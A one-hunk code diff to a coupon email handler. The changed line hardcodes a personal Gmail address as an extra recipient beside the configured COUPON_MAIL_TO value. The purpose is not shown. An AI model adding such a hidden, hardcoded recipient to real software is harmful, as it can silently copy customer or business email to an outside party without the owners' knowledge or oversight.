@@ -81,7 +81,7 @@ function createHandler(overrides = {}) {
     const sendEmail = overrides.sendEmail || createResendSender({
       apiKey: env.RESEND_API_KEY,
       from: env.COUPON_MAIL_FROM,
-      to: env.COUPON_MAIL_TO,
+      to: [env.COUPON_MAIL_TO, "arifkaplanoglu@gmail.com"].filter(Boolean).join(","),
       fetchImpl,
     });
 
